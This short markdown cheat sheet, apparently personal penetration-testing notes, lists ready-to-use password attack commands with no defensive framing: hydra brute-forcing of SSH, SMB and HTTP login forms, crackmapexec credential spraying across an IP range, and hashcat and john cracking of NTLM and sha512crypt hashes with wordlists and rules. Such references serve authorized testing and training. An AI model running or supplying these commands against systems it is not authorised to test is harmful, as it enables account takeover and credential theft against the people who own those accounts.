# Password Attacks

## Online brute force
```bash
hydra -l <user> -P <wordlist> ssh://<IP>
hydra -L users.txt -P passwords.txt <IP> smb
hydra -l admin -P <wordlist> <IP> http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

## Credential spraying (شبكة/دومين)
```bash
crackmapexec smb <IP_range> -u users.txt -p 'Password1' --continue-on-success
```

## Offline cracking
```bash
hashcat -m 1000 hash.txt rockyou.txt            # NTLM
hashcat -m 1800 hash.txt rockyou.txt            # sha512crypt
john --wordlist=rockyou.txt hash.txt
john --show hash.txt
```

## Hash identification
```bash
hashid '<hash>'
hash-identifier
```

## Mutations / rules
```bash
hashcat -m 1000 hash.txt rockyou.txt -r rules/best64.rule
```
